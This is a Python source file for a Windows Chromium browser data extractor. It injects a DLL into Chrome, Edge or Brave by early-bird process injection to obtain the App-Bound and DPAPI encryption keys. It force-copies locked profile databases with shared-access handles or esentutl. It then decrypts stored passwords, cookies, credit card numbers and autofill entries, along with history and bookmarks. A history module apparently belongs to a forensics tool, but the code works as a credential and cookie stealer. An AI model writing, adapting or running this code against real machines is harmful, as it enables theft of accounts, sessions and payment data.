import os
import json
import sqlite3
import shutil
import struct
from typing import Dict, List, Optional, Any
from utils.config import BrowserType, FILE_TYPE_COOKIES, FILE_TYPE_HISTORY, FILE_TYPE_LOGIN_DATA, FILE_TYPE_WEB_DATA, FILE_TYPE_BOOKMARKS, PACKET_SIG_APP_BOUND_KEY, PACKET_SIG_DPAPI_KEY, FILE_TYPE_LOCAL_STATE, STR_DLL_NAME
from utils.common import get_browser_path, get_browser_data_file
from utils.crypto import decrypt_dpapi, decrypt_chromium_v10, decrypt_chromium_v20
from utils.injector import Injector
from utils.time_utils import webkit_to_datetime

import win32file

import subprocess

class ChromiumExtractor:
    def __init__(self, browser_type: str):
        self.browser_type = browser_type
        self.master_key = None
        self.app_bound_key = None
        
    def _force_copy_file(self, src: str, dst: str):
        """Copies a file even if it is locked by another process (using shared access or esentutl)."""
        # Method 1: Try win32file with shared access
        try:
            h_src = win32file.CreateFile(
                src,
                win32file.GENERIC_READ,
                win32file.FILE_SHARE_READ | win32file.FILE_SHARE_WRITE | win32file.FILE_SHARE_DELETE,
                None,
                win32file.OPEN_EXISTING,
                0,
                0
            )
            
            h_dst = win32file.CreateFile(
                dst,
                win32file.GENERIC_WRITE,
                0,
                None,
                win32file.CREATE_ALWAYS,
                win32file.FILE_ATTRIBUTE_NORMAL,
                0
            )
            
            chunk_size = 4096
            while True:
                err, data = win32file.ReadFile(h_src, chunk_size)
                if not data: break
                win32file.WriteFile(h_dst, data)
                
            win32file.CloseHandle(h_src)
            win32file.CloseHandle(h_dst)
            return True
        except Exception as e:
            # print(f"[!] Win32 Copy Failed: {e}")
            pass

        # Method 2: Try esentutl (Shadow Copy)
        try:
            # esentutl /y <source> /d <dest>
            # It copies even locked files usually
            print(f"[*] Attempting fallback copy with esentutl for {src}")
            cmd = f'esentutl.exe /y "{src}" /d "{dst}"'
            # Suppress output
            subprocess.check_call(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return True
        except Exception as e:
            print(f"[!] Error force copying file {src}: {e}")
            return False
        
    def _parse_packet_data(self, data: bytes):
        """Parse the binary data returned by the injected DLL."""
        offset = 0
        debug_buffer = bytearray()
        
        while offset < len(data):
            # Try to read signature
            if offset + 4 <= len(data):
                try:
                    sig = struct.unpack("<I", data[offset:offset+4])[0]
                    
                    if sig == PACKET_SIG_APP_BOUND_KEY or sig == PACKET_SIG_DPAPI_KEY:
                        # Found a packet signature!
                        # Flush any debug logs collected
                        if debug_buffer:
                            try:
                                print(f"[DLL LOG] {debug_buffer.decode('utf-8', errors='ignore').strip()}")
                            except: pass
                            debug_buffer = bytearray()

                        # Get Data Size (4 bytes)
                        if offset + 8 <= len(data):
                            size = struct.unpack("<I", data[offset+4:offset+8])[0]
                            
                            if offset + 8 + size <= len(data):
                                payload = data[offset+8:offset+8+size]
                                
                                if sig == PACKET_SIG_APP_BOUND_KEY:
                                    self.app_bound_key = payload
                                    print("[+] Received App-Bound Key")
                                elif sig == PACKET_SIG_DPAPI_KEY:
                                    self.master_key = payload
                                    print("[+] Received DPAPI Key")
                                    
                                offset += 8 + size
                                continue
                            else:
                                print(f"[!] Warning: Incomplete packet at offset {offset}")
                        else:
                            print(f"[!] Warning: Truncated size field at offset {offset}")
                except Exception:
                    pass
            
            # If not a packet, it's likely debug log text
            debug_buffer.append(data[offset])
            offset += 1
            
        # Flush remaining debug logs
        if debug_buffer:
             try:
                print(f"[DLL LOG] {debug_buffer.decode('utf-8', errors='ignore').strip()}")
             except: pass

    def get_keys(self) -> bool:
        """Retrieve encryption keys. Use injection for App-Bound, file read for others."""
        
        # Check if we need injection (Chrome, Edge, Brave)
        needs_injection = self.browser_type in [BrowserType.CHROME, BrowserType.EDGE, BrowserType.BRAVE]
        
        if needs_injection:
            print(f"[*] Starting injection for {self.browser_type}...")
            browser_path = get_browser_path(self.browser_type)
            if not browser_path:
                print(f"[!] Could not find executable for {self.browser_type}")
                return False
                
            # Assume DLL is in current directory or bin
            import sys
            possible_dlls = []
            if getattr(sys, 'frozen', False):
                possible_dlls.append(os.path.join(sys._MEIPASS, "utils", STR_DLL_NAME))
            
            possible_dlls.extend([
                os.path.join("utils", STR_DLL_NAME),
                STR_DLL_NAME,
                os.path.join("bin", STR_DLL_NAME),
                os.path.join("..", "bin", STR_DLL_NAME)
            ])
            dll_path = None
            for p in possible_dlls:
                if os.path.exists(os.path.abspath(p)):
                    dll_path = os.path.abspath(p)
                    break
            
            if not dll_path:
                print(f"[!] Could not find {STR_DLL_NAME}. Please ensure it is compiled and placed in the script directory.")
                return False
                
            injector = Injector()
            # print(f"DEBUG: Injecting {dll_path} into {browser_path}")
            data = injector.inject_dll_via_early_bird(browser_path, dll_path)
            
            if data:
                self._parse_packet_data(data)
                
            if self.app_bound_key:
                return True
            elif self.master_key:
                print("\n[!] CRITICAL WARNING: App-Bound (V20) key missing, but DPAPI key found.")
                print("    This usually happens because background browser processes are interfering.")
                print("    ACTION REQUIRED: Kill all instances of chrome.exe/msedge.exe via Task Manager or run:")
                print("    taskkill /F /IM chrome.exe /IM msedge.exe")
                print("    Proceeding with LIMITED decryption (V10 only). Most V20 passwords will remain <encrypted>.\n")
                return True
            else:
                print("[!] Failed to retrieve Keys via injection.")
                return False

        else:
            # Opera, Vivaldi, etc. use simple DPAPI on Local State
            print(f"[*] Reading Local State for {self.browser_type}...")
            local_state_path = get_browser_data_file(self.browser_type, FILE_TYPE_LOCAL_STATE)
            if not local_state_path:
                print("[!] Local State file not found")
                return False
                
            try:
                with open(local_state_path, "r", encoding="utf-8") as f:
                    state = json.load(f)
                
                encrypted_key_b64 = state["os_crypt"]["encrypted_key"]
                import base64
                encrypted_key = base64.b64decode(encrypted_key_b64)
                
                # First 5 bytes are DPAPI string
                if encrypted_key[:5] == b"DPAPI":
                    self.master_key = decrypt_dpapi(encrypted_key[5:])
                    if self.master_key:
                        print("[+] Master Key Decrypted (DPAPI)")
                        return True
            except Exception as e:
                print(f"[!] Error reading/decrypting Local State: {e}")
                
        return False



    def extract_cookies(self) -> List[Dict]:
        path = get_browser_data_file(self.browser_type, FILE_TYPE_COOKIES)
        results = []
        if not path: return results
        
        print(f"[*] Extracting Cookies from {path}")
        
        # Copy to temp to avoid locking
        temp_path = f"temp_cookies_{self.browser_type}.db"
        if not self._force_copy_file(path, temp_path):
             return results
        
        try:
            conn = sqlite3.connect(temp_path)
            cursor = conn.cursor()
            cursor.execute("SELECT host_key, path, name, value, expires_utc, encrypted_value FROM cookies")
            
            for row in cursor.fetchall():
                host, path, name, value, expires, enc_val = row
                decrypted_value = value
                
                if enc_val:
                    decrypted_value = self._decrypt_value(enc_val)
                    if not decrypted_value: decrypted_value = "<encrypted>"

                results.append({
                    "host": host,
                    "path": path,
                    "name": name,
                    "value": decrypted_value,
                    "expires": expires
                })
                
            conn.close()
        except Exception as e:
            print(f"[!] Error extracting cookies: {e}")
        finally:
            if os.path.exists(temp_path): os.remove(temp_path)
            
        return results

    def extract_logins(self) -> List[Dict]:
        path = get_browser_data_file(self.browser_type, FILE_TYPE_LOGIN_DATA)
        results = []
        if not path: return results
        
        print(f"[*] Extracting Logins from {path}")
        temp_path = f"temp_logins_{self.browser_type}.db"
        if not self._force_copy_file(path, temp_path):
             return results
        
        try:
            conn = sqlite3.connect(temp_path)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, action_url, username_value, password_value FROM logins")
            
            for row in cursor.fetchall():
                origin, action, user, enc_pass = row
                decrypted_pass = self._decrypt_value(enc_pass)
                if not decrypted_pass: decrypted_pass = "<encrypted>"

                results.append({
                    "origin": origin,
                    "action": action,
                    "username": user,
                    "password": decrypted_pass
                })
                
            conn.close()
        except Exception as e:
            print(f"[!] Error extracting logins: {e}")
        finally:
             if os.path.exists(temp_path): os.remove(temp_path)

        return results

    def extract_history(self) -> List[Dict]:
        path = get_browser_data_file(self.browser_type, FILE_TYPE_HISTORY)
        results = []
        if not path: return results
        
        print(f"[*] Extracting History from {path}")
        temp_path = f"temp_history_{self.browser_type}.db"
        if not self._force_copy_file(path, temp_path):
             return results
        
        try:
            conn = sqlite3.connect(temp_path)
            cursor = conn.cursor()
            cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls")
            
            for row in cursor.fetchall():
                url, title, count, last_visit = row
                results.append({
                    "url": url,
                    "title": title,
                    "visit_count": count,
                    "last_visit_time": webkit_to_datetime(last_visit)
                })
            conn.close()
        except Exception as e:
            print(f"[!] Error extracting history: {e}")
            
        try:
            if os.path.exists(temp_path):
                from utils.intelligence import BAFIntelligence
                actual_urls = [r["url"] for r in results if isinstance(r, dict)]
                intel = BAFIntelligence(self.browser_type)
                self.deleted_history = intel.carve_deleted_history(temp_path, actual_urls)
        except Exception:
            self.deleted_history = []
            
        finally:
            if os.path.exists(temp_path): os.remove(temp_path)
            
        return results

    def extract_web_data(self) -> Dict[str, List[Dict]]:
        path = get_browser_data_file(self.browser_type, FILE_TYPE_WEB_DATA)
        data = {"credit_cards": [], "autofill": []}
        if not path: return data
        
        print(f"[*] Extracting Web Data from {path}")
        temp_path = f"temp_webdata_{self.browser_type}.db"
        if not self._force_copy_file(path, temp_path):
             return data
        
        try:
            conn = sqlite3.connect(temp_path)
            cursor = conn.cursor()
            
            # Credit Cards
            try:
                cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, nickname FROM credit_cards")
                for row in cursor.fetchall():
                    name, month, year, enc_num, nickname = row
                    decrypted_num = self._decrypt_value(enc_num)
                    if not decrypted_num: decrypted_num = "<encrypted>"
                    
                    data["credit_cards"].append({
                        "name_on_card": name,
                        "expiration_month": month,
                        "expiration_year": year,
                        "card_number": decrypted_num,
                        "nickname": nickname
                    })
            except Exception as e:
                pass # Table might not exist

            # Autofill
            try:
                cursor.execute("SELECT name, value, date_created, count FROM autofill")
                for row in cursor.fetchall():
                    name, value, created, count = row
                    data["autofill"].append({
                        "name": name,
                        "value": value,
                        "date_created": created,
                        "count": count
                    })
            except Exception as e:
                pass

            conn.close()
        except Exception as e:
            print(f"[!] Error extracting web data: {e}")
        finally:
            if os.path.exists(temp_path): os.remove(temp_path)
            
        return data

    def extract_bookmarks(self) -> List[Dict]:
        path = get_browser_data_file(self.browser_type, FILE_TYPE_BOOKMARKS)
        results = []
        if not path or not os.path.exists(path): return results
        
        print(f"[*] Extracting Bookmarks from {path}")
        try:
            with open(path, "r", encoding="utf-8") as f:
                data = json.load(f)
            
            roots = data.get("roots", {})
            for key in roots:
                self._parse_bookmark_node(roots[key], results)
                
        except Exception as e:
            print(f"[!] Error extracting bookmarks: {e}")
            
        return results

    def _parse_bookmark_node(self, node: Dict, results: List[Dict]):
        if node.get("type") == "url":
            results.append({
                "name": node.get("name"),
                "url": node.get("url"),
                "date_added": node.get("date_added")
            })
        if "children" in node:
            for child in node["children"]:
                self._parse_bookmark_node(child, results)

    def _decrypt_value(self, encrypted_value: bytes) -> Optional[str]:
        if not encrypted_value: return None
        
        try:
            decrypted_bytes = None
            
            if encrypted_value.startswith(b'v10') or encrypted_value.startswith(b'v11'):
                if self.master_key:
                    decrypted_bytes = decrypt_chromium_v10(self.master_key, encrypted_value)
            
            elif encrypted_value.startswith(b'v20'):
                if self.app_bound_key:
                    decrypted_bytes = decrypt_chromium_v20(self.app_bound_key, encrypted_value)
            
            # If we successfully decrypted bytes, try to decode them intelligently
            if decrypted_bytes:
                # 1. Try decoding as clean UTF-8 (best case)
                try:
                    return decrypted_bytes.decode('utf-8')
                except UnicodeDecodeError:
                    pass
                
                # 2. V20 often has a 32-byte binary prefix (HMAC/Metadata). Try slicing it.
                if len(decrypted_bytes) > 32:
                    try:
                        return decrypted_bytes[32:].decode('utf-8')
                    except UnicodeDecodeError:
                        pass

                # 3. Fallback: Decode with replacement to show *something* rather than <encrypted>
                # This helps user see if partial data exists
                return decrypted_bytes.decode('utf-8', errors='replace')

        except Exception as e:
            # If actual crypto decryption failed (e.g. padding/tag error), we land here
            # print(f"[!] Decryption failed: {e}")
            pass
            
        return None
